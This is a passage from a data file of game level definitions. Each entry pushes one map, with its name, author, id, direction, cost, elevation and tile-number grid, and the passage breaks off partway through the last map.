maps.push({name="Escape The Eye",author="ZpLit",id="#1668326433",direction="left",cost=371,elevation=9,map=[0,0,0,0,0,0,24,5,5,5,5,2,2,5,5,5,5,24,0,0,0,0,0,0,0,0,24,5,5,5,5,5,5,5,5,5,5,24,0,0,0,0,0,0,0,0,24,66,73,73,73,73,73,26,26,73,73,24,0,0,0,0,0,0,0,0,24,71,73,73,73,73,73,27,27,73,73,24,0,0,0,0,0,0,0,0,24,71,73,73,73,73,73,26,26,73,73,24,0,0,0,0,0,0,0,0,24,5,5,5,5,5,5,5,5,5,5,24,0,0,0,0,0,0,0,0,24,94,5,5,5,5,5,5,5,5,5,24,0,0,0,0,0,0,0,0,0,24,24,24,24,24,24,5,5,5,5,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,5,5,5,5,24,0,0,0,24,24,24,1,24,24,24,24,24,24,24,24,5,5,5,5,24,0,0,24,14,14,14,3,5,5,162,162,162,162,162,5,5,5,5,5,24,0,0,24,14,93,14,3,5,5,162,162,162,162,162,5,5,5,5,5,24,0,0,24,14,14,14,3,5,5,162,162,162,162,162,5,5,5,5,5,24,0,0,24,14,14,14,1,24,24,24,24,24,24,24,24,95,95,95,95,24,0,0,24,14,14,14,24,0,0,0,0,0,0,0,24,5,5,0,0,24,0,0,24,14,14,14,24,24,24,24,24,24,24,24,24,5,5,0,0,24,0,0,2,14,14,87,14,13,12,11,10,9,8,7,6,5,5,0,0,24,0,0,2,14,93,87,14,13,12,11,10,9,8,7,6,5,5,5,5,24,0,0,24,14,14,87,14,13,12,11,10,9,8,7,6,5,5,5,5,24,0,0,0,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,0,0,0]});
maps.push({name="Downdraft",author="ZpLit",id="#1668326774",direction="forward",cost=168,elevation=-15,map=[0,0,0,0,0,0,0,0,22,2,2,22,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,22,127,127,22,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,130,130,130,130,130,130,0,0,0,0,0,0,0,0,0,0,0,0,0,0,130,130,130,130,130,130,0,0,0,0,0,0,0,0,0,0,0,0,0,0,130,130,130,130,130,130,0,0,0,0,0,0,0,0,0,0,0,0,0,0,130,130,130,130,130,130,0,0,0,0,0,0,0,0,0,0,0,0,0,0,130,130,130,130,130,130,0,0,0,0,0,0,0,0,0,0,0,0,0,0,130,130,130,130,130,130,0,0,0,0,0,0,0,0,0,0,0,0,0,0,130,130,130,130,130,130,0,0,0,0,0,0,0,0,0,0,0,0,0,0,130,130,130,130,130,130,0,0,0,0,0,0,0,0,0,0,0,0,0,0,130,130,130,130,130,130,0,0,0,0,0,0,0,0,0,0,0,0,0,0,130,130,130,130,130,130,0,0,0,0,0,0,0,0,0,0,0,0,0,0,130,130,130,130,130,130,0,0,0,0,0,0,0,0,0,0,0,0,0,0,130,130,130,130,130,130,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,7,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,88,2,2,88,0,0,0,0,0,0,0,0]});
maps.push({name="CVpaste 9",author="ZpLit",id="#1668327306",direction="forward",cost=122,elevation=0,map=[0,0,0,0,0,0,0,14,14,14,2,2,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,5,5,5,5,5,153,0,0,0,0,0,0,0,0,0,0,0,0,0,12,5,5,5,5,9998,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,5,5,14,9998,87,13,0,0,0,0,0,0,0,0,0,0,0,0,0,10,5,5,5,5,9998,188,0,0,0,0,0,0,0,0,0,0,0,0,0,9,5,5,5,5,9998,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,5,5,14,9998,87,13,0,0,0,0,0,0,0,0,0,0,0,0,0,7,5,5,5,5,9998,188,0,0,0,0,0,0,0,0,0,0,0,0,0,6,5,5,5,5,9998,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,14,9998,87,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,9998,188,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,9998,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,14,9998,87,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,9998,188,0,0,155,0,0,0,0,0,0,0,0,0,0,0,3,5,5,5,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,2,2,14,14,154,0,0,0,0,0,0]});
maps.push({name="RACE Split",author="FL00D",id="#1668327516",direction="forward",cost=166,elevation=0,map=[0,0,0,0,0,0,0,0,12,2,2,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,12,12,0,0,0,0,0,0,0,0,0,0,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,0,0,0,0,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,0,0,0,0,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,0,0,0,0,12,12,12,0,0,0,0,0,0,0,0,0,0,12,12,12,0,0,0,0,12,12,12,0,0,0,0,0,0,0,0,0,0,12,12,12,0,0,0,0,12,12,12,0,0,0,0,0,0,0,0,0,0,12,12,12,0,0,0,0,12,12,12,0,0,0,0,0,0,0,0,0,0,12,12,12,0,0,0,0,12,12,12,0,0,0,0,0,0,0,0,0,0,12,12,12,0,0,0,0,12,12,12,0,0,0,0,0,0,0,0,0,0,12,12,12,0,0,0,0,12,12,12,0,0,0,0,0,0,0,0,0,0,12,12,12,0,0,0,0,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,0,0,0,0,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,0,0,0,0,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,0,0,0,0,0,0,0,0,0,0,12,12,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,2,2,12,0,0,0,0,0,0,0,0]});
maps.push({name="RACE Square",author="FL00D",id="#1668327548",direction="left",cost=162,elevation=-2,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,2,2,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,18,18,0,0,0,0,0,36,36,36,36,36,36,36,36,36,36,36,36,36,36,18,0,0,0,0,0,36,36,36,36,36,36,36,36,36,36,36,36,36,36,18,0,0,0,0,0,36,36,36,36,36,36,36,36,36,36,36,36,36,36,18,0,0,0,0,0,36,36,36,0,0,0,0,0,0,0,0,36,36,36,0,0,0,0,0,0,36,36,36,0,0,0,0,0,0,0,0,36,36,36,0,0,0,0,0,0,36,36,36,0,0,0,0,0,0,0,0,36,36,36,0,0,0,0,0,0,36,36,36,0,0,0,0,0,0,0,0,36,36,36,0,0,0,0,0,0,36,36,36,0,0,0,0,0,0,0,0,36,36,36,0,0,0,0,0,0,36,36,36,0,0,0,0,0,0,0,0,36,36,36,0,0,0,0,0,0,36,36,36,0,0,0,0,0,0,0,0,36,36,36,0,0,0,0,0,0,36,36,36,0,0,0,0,0,0,0,0,36,36,36,0,0,0,16,16,16,36,36,36,36,36,36,36,36,36,36,36,36,36,36,0,0,0,2,16,16,36,36,36,36,36,36,36,36,36,36,36,36,36,36,0,0,0,2,16,16,36,36,36,36,36,36,36,36,36,36,36,36,36,36,0,0,0,16,16,16,16,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="RACE Avoid Middle",author="TF2 Pencil",id="#1668327826",direction="forward",cost=140,elevation=0,map=[0,0,15,2,2,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,0,0,0,0,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,0,0,0,0,15,15,15,15,15,0,0,0,0,0,0,15,15,15,15,15,0,0,0,0,15,15,15,15,15,0,0,0,0,0,0,15,15,15,15,15,0,0,0,0,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,0,0,0,0,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,2,2,15,0,0]});
maps.push({name="RACE Tunnel",author="TF2 Pencil",id="#1668327854",direction="left",cost=174,elevation=0,map=[0,0,14,2,2,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,114,114,114,114,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,114,114,114,114,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,0,0,0,0,0,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,0,0,0,0,0,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,0,0,0,0,0,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,114,114,114,114,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,114,114,114,114,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,114,114,114,114,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,114,114,114,114,0,0,0,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,0,0,0,2,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,0,0,0,2,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,0,0,0,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="RACE Unknown Name",author="TF2 Pencil",id="#1668328007",direction="right",cost=140,elevation=0,map=[0,0,0,0,0,0,40,2,2,40,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,40,40,40,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,40,40,40,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,40,40,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,40,40,40,40,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,40,40,40,40,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,40,40,40,40,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,40,40,40,40,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,40,40,40,40,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,40,40,40,40,40,40,40,5,0,0,0,0,0,0,0,0,0,0,0,0,40,40,40,40,40,40,40,5,0,0,0,0,0,0,0,0,0,0,0,0,40,40,40,40,40,40,40,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,40,40,40,40,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,40,40,40,40,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,40,40,40,40,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,40,40,40,40,5,5,5,5,40,40,40,0,0,0,0,0,0,0,0,40,40,40,40,40,40,40,40,40,40,40,2,0,0,0,0,0,0,0,0,40,40,40,40,40,40,40,40,40,40,40,2,0,0,0,0,0,0,0,0,40,40,40,40,40,40,40,40,40,40,40,40,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="RACE UTurn",author="FL00D",id="#1668328439",direction="left",cost=154,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,9,2,2,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,0,0,0,0,0,9,9,9,9,9,9,9,0,0,0,0,0,9,9,9,0,0,0,0,0,2,9,9,9,9,9,9,9,0,0,0,0,9,9,9,0,0,0,0,0,2,9,9,9,9,9,9,9,9,0,0,0,9,9,9,0,0,0,0,0,9,9,9,9,9,9,9,9,9,0,0,0,9,9,9,0,0,0,0,0,0,0,0,0,0,0,9,9,9,0,0,0,9,9,9,0,0,0,0,0,0,0,0,0,0,0,9,9,9,0,0,0,9,9,9,0,0,0,0,0,0,0,0,0,0,0,9,9,9,0,0,0,9,9,9,0,0,0,0,0,0,0,0,0,0,0,9,9,9,0,0,0,9,9,9,0,0,0,0,0,0,0,0,0,0,0,9,9,9,0,0,0,9,9,9,0,0,0,0,0,0,0,0,0,0,0,9,9,9,0,0,0,9,9,9,0,0,0,0,0,0,0,0,0,0,9,9,9,9,0,0,0,9,9,9,9,0,0,0,0,0,0,0,0,0,9,9,9,9,0,0,0,9,9,9,9,0,0,0,0,0,0,0,0,0,9,9,9,9,0,0,0,9,9,9,9,0,0,0,0,0,0,0,0,0,9,9,9,9,9,9,9,9,9,9,9,0,0,0,0,0,0,0,0,0,9,9,9,9,9,9,9,9,9,9,9,0,0,0,0,0,0,0,0,0,9,9,9,9,9,9,9,9,9,9,9,0,0,0,0]});
maps.push({name="RACE Uphill",author="FL00D",id="#1668328469",direction="right",cost=164,elevation=19,map=[0,0,5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,24,24,24,24,24,24,24,24,0,0,5,5,5,5,0,0,0,0,0,0,24,24,24,24,24,24,24,2,0,0,5,5,5,5,0,0,0,0,0,0,24,24,24,24,24,24,24,2,0,0,5,5,5,5,0,0,0,0,0,0,24,24,24,24,24,24,24,24,0,0,6,6,6,6,0,0,0,0,0,0,23,23,23,23,0,0,0,0,0,0,7,7,7,7,0,0,0,0,0,0,22,22,22,22,0,0,0,0,0,0,8,8,8,8,0,0,0,0,0,0,21,21,21,21,0,0,0,0,0,0,9,9,9,9,0,0,0,0,0,0,20,20,20,20,0,0,0,0,0,0,10,10,10,10,0,0,0,0,0,0,19,19,19,19,0,0,0,0,0,0,11,11,11,11,12,13,14,15,16,17,18,18,18,18,0,0,0,0,0,0,11,11,11,11,12,13,14,15,16,17,18,18,18,18,0,0,0,0,0,0,11,11,11,11,12,13,14,15,16,17,18,18,18,18,0,0,0,0,0,0,11,11,11,11,12,13,14,15,16,17,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="RACE Generic Chicane",author="ZpLit",id="#1668328604",direction="forward",cost=89,elevation=0,map=[0,0,0,0,0,0,0,0,14,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,14,0,0,0,0,0,0,0,0]});
maps.push({name="RACE Downstairs",author="FL00D",id="#1668328746",direction="forward",cost=161,elevation=-16,map=[0,24,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,22,22,22,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,22,22,22,0,0,0,0,0,0,16,16,16,14,14,14,14,0,0,0,0,22,22,22,0,0,0,0,0,0,16,16,16,14,14,14,14,0,0,0,0,22,22,22,0,0,0,0,0,0,16,16,16,14,14,14,14,0,0,0,0,20,20,20,0,0,0,0,0,0,16,16,16,1,12,12,12,0,0,0,0,20,20,20,0,0,0,0,0,0,16,16,16,1,12,12,12,0,0,0,0,20,20,20,0,0,0,0,0,0,16,16,16,1,12,12,12,0,0,0,0,20,20,20,0,0,0,0,0,0,16,16,16,1,12,12,12,0,0,0,0,20,20,20,0,0,0,0,0,0,18,18,18,1,10,10,10,0,0,0,0,20,20,20,20,18,18,18,18,18,18,18,18,1,10,10,10,0,0,0,0,20,20,20,20,18,18,18,18,18,18,18,18,1,10,10,10,0,0,0,0,20,20,20,20,18,18,18,18,18,18,18,18,1,10,10,10,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,8,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,2,2,0,0,0]});
maps.push({name="Sit Down in the Boat",author="ZpLit",id="#1668329069",direction="left",cost=553,elevation=0,map=[88,14,14,14,14,93,0,0,0,0,0,0,0,0,14,14,2,2,14,0,2,14,14,14,14,14,0,0,0,0,0,0,0,0,14,14,90,14,14,0,2,14,14,14,14,14,0,0,0,0,0,0,0,0,90,14,14,14,14,0,88,1,14,14,14,1,0,0,0,0,0,0,0,0,14,14,14,90,14,0,67,73,67,0,67,74,67,0,0,0,0,0,0,0,14,90,14,14,14,0,67,73,142,142,142,74,67,0,0,0,0,0,0,0,14,14,14,14,90,0,67,73,67,0,67,74,67,0,0,0,0,0,0,0,1,95,95,95,1,0,67,73,67,0,67,74,67,0,0,0,0,0,0,67,73,14,14,14,74,67,67,73,142,142,142,74,67,0,0,0,0,0,0,67,73,14,14,14,74,67,67,73,142,142,142,74,67,0,0,0,0,0,0,67,73,14,14,14,74,67,67,73,67,0,67,74,67,0,0,0,0,0,0,67,73,14,14,14,74,67,67,73,67,0,67,74,67,0,0,0,0,0,0,67,73,14,14,14,74,67,67,73,142,142,142,74,67,0,0,0,0,0,0,67,73,14,14,14,74,67,67,73,67,0,67,74,67,67,67,67,67,67,67,67,73,14,14,14,74,67,67,1,151,0,151,1,71,71,71,71,71,71,71,71,1,14,14,14,1,0,0,14,14,14,14,14,67,142,142,67,142,142,67,151,14,14,14,14,14,0,0,14,14,14,14,14,0,142,142,0,142,142,0,0,14,14,14,14,14,0,0,14,14,14,14,14,67,142,142,67,142,142,67,151,14,14,14,14,14,0,0,94,14,14,14,1,72,72,72,72,72,72,72,72,1,14,14,14,94,0,0,0,0,0,0,0,67,67,67,67,67,67,67,67,0,0,0,0,0,0]});
maps.push({name="Waterway",author="sivi",id="#1668348392",direction="left",cost=578,elevation=0,map=[1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,5,2,2,5,90,105,105,90,105,90,105,105,90,105,106,7,8,9,9,1,5,5,5,90,2,105,105,105,105,105,105,105,105,105,106,7,8,9,9,1,90,160,160,5,2,105,105,105,105,105,105,105,105,105,1,0,0,159,159,1,5,160,160,5,90,105,90,105,105,90,105,105,105,90,1,0,0,159,159,1,5,160,160,90,1,1,1,1,1,1,1,105,105,105,1,0,0,159,159,1,90,160,160,5,1,1,1,1,1,1,1,105,105,105,1,0,0,159,159,1,5,160,160,5,1,11,90,11,65,65,67,65,65,65,67,0,0,159,159,1,5,160,160,90,1,11,65,65,65,65,67,65,65,65,67,0,0,159,159,1,90,160,160,5,1,11,65,65,65,65,67,65,65,65,67,0,0,93,93,1,5,160,160,5,1,11,11,11,11,1,1,1,1,1,1,1,1,1,1,1,90,160,160,5,1,141,141,141,141,1,0,0,0,0,0,0,0,0,0,1,5,160,160,90,1,8,8,8,8,1,0,0,0,0,0,0,0,0,0,1,5,160,160,5,1,90,158,158,8,1,0,0,0,0,0,0,0,0,0,1,90,160,160,5,1,8,159,159,90,1,1,1,1,1,1,1,1,1,1,1,5,160,160,90,1,8,159,159,8,8,90,8,8,141,5,5,90,5,5,90,5,160,160,5,1,90,159,159,161,161,161,161,8,141,5,158,161,161,161,161,161,161,161,5,1,8,159,159,161,161,161,161,8,141,5,158,161,161,161,161,161,161,161,90,1,8,90,8,90,8,8,90,8,141,5,90,5,5,90,5,5,90,5,5,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="Blinker city lite",author="Dogeeri",id="#1668358991",direction="right",cost=346,elevation=-3,map=[0,0,0,0,0,199,10,2,2,10,199,0,0,0,0,6,6,7,8,8,0,0,0,0,0,199,10,10,10,10,199,0,0,0,6,6,6,6,7,2,0,0,0,1,1,199,142,142,142,142,199,1,1,0,7,7,6,6,6,2,0,154,7,1,93,199,10,10,10,10,199,94,1,0,8,8,91,91,91,7,0,155,0,1,144,199,9,9,9,9,199,144,1,0,91,91,91,159,0,0,0,153,5,1,144,91,9,9,9,9,91,144,1,0,162,162,162,159,0,0,0,0,0,1,1,1,8,8,8,8,1,1,1,0,159,0,0,0,0,0,0,0,0,0,0,8,8,8,8,8,0,0,0,0,159,0,1,1,1,1,0,0,0,0,7,7,7,7,7,0,0,0,0,0,159,161,161,108,111,89,0,0,87,7,7,7,7,7,0,0,0,0,0,0,0,0,0,108,111,111,0,0,7,7,7,7,7,87,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,6,6,6,0,0,0,0,0,0,0,1,1,1,0,0,0,0,6,6,6,6,6,0,0,0,0,111,10,9,8,7,6,89,1,0,0,0,6,6,7,6,6,0,0,0,0,111,199,8,6,7,6,6,1,0,0,0,6,6,6,6,6,0,0,0,0,112,1,7,7,7,6,3,1,0,0,0,6,6,6,6,6,0,0,0,0,112,1,6,6,6,3,116,1,0,0,0,7,7,7,7,7,1,1,1,1,112,1,6,6,90,1,115,1,0,151,0,91,91,91,7,9,109,96,109,111,111,1,142,1,1,1,114,199,0,111,0,5,5,91,7,9,109,96,109,111,111,1,93,1,0,0,95,113,112,111,91,97,5,91,7,7,1,1,108,106,106,94,1,1,0,0,114,113,112,91,91]});
maps.push({name="RACE Simple Split",author="TF2 Pencil",id="#1668359135",direction="forward",cost=188,elevation=0,map=[17,2,2,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,0,0,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,0,0,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,0,0,0,0,17,17,17,0,0,0,0,0,0,0,0,0,0,17,17,17,0,0,0,0,17,17,17,0,0,0,0,0,0,0,0,0,0,17,17,17,0,0,0,0,17,17,17,0,0,0,0,0,0,0,0,0,0,17,17,17,0,0,0,0,17,17,17,0,0,0,0,0,0,0,0,0,0,17,17,17,0,0,0,0,17,17,17,0,0,0,0,0,0,0,0,0,0,17,17,17,0,0,0,0,17,17,17,0,0,0,0,0,0,0,0,0,0,17,17,17,0,0,0,0,17,17,17,0,0,0,0,0,0,0,0,0,0,17,17,17,0,0,0,0,17,17,17,0,0,0,0,0,0,0,0,0,0,17,17,17,0,0,0,0,17,17,17,0,0,0,0,0,0,0,0,0,0,17,17,17,0,0,0,0,17,17,17,0,0,0,0,0,0,0,0,0,0,17,17,17,0,0,0,0,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,0,0,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,0,0,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,2,2,17]});
maps.push({name="RACE Little Z",author="TF2 Pencil",id="#1668359231",direction="forward",cost=132,elevation=0,map=[0,0,2,2,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,16,0,0,0,0,0,0,1,1,1,1,1,0,0,0,0,0,0,36,36,36,0,0,0,0,0,0,36,36,36,36,1,0,0,0,0,0,0,36,36,36,0,0,0,0,0,36,36,36,36,36,0,0,0,0,0,0,0,36,36,36,0,0,0,0,36,36,36,36,36,36,0,0,0,0,0,0,0,36,36,36,0,0,0,36,36,36,36,36,36,36,0,0,0,0,0,0,0,36,36,36,0,0,36,36,36,36,36,36,36,36,0,0,0,0,0,0,0,36,36,36,0,36,36,36,36,36,0,36,36,36,0,0,0,0,0,0,0,36,36,36,36,36,36,36,0,0,0,36,36,36,0,0,0,0,0,0,0,36,36,36,36,36,36,0,0,0,0,36,36,36,0,0,0,0,0,0,0,36,36,36,36,36,0,0,0,0,0,36,36,36,0,0,0,0,0,0,1,36,36,36,36,0,0,0,0,0,0,36,36,36,0,0,0,0,0,0,1,1,1,1,1,0,0,0,0,0,0,16,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,2,2,0,0,0,0,0]});
maps.push({name="RACE Unknown Name 2",author="FL00D",id="#1668359330",direction="forward",cost=160,elevation=0,map=[0,15,2,2,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,15,15,0,0,0,0,0,0,0,0,15,15,0,0,0,0,0,0,15,15,15,15,0,0,0,0,0,0,15,15,15,15,15,15,0,0,0,0,15,15,15,15,15,0,0,0,0,15,15,15,15,15,15,15,15,0,0,0,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,0,0,0,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,0,0,0,15,15,15,15,15,15,15,15,15,15,